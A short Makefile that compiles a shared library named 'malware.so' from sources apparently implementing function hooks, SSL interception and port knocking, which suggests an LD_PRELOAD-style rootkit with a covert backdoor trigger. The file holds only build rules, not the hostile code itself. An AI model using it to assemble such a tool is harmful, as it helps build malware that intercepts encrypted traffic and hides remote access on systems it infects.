CC = gcc
CFLAGS = -Wall -fPIC -shared
LIBS = -ldl -lssl -lcrypto

all: malware.so

malware.so: main.c hooks.c hook_ssl.c port_knock.c
	$(CC) $(CFLAGS) -o malware.so main.c hooks.c hook_ssl.c  port_knock.c $(LIBS)

clean:
	rm -f *.so *.o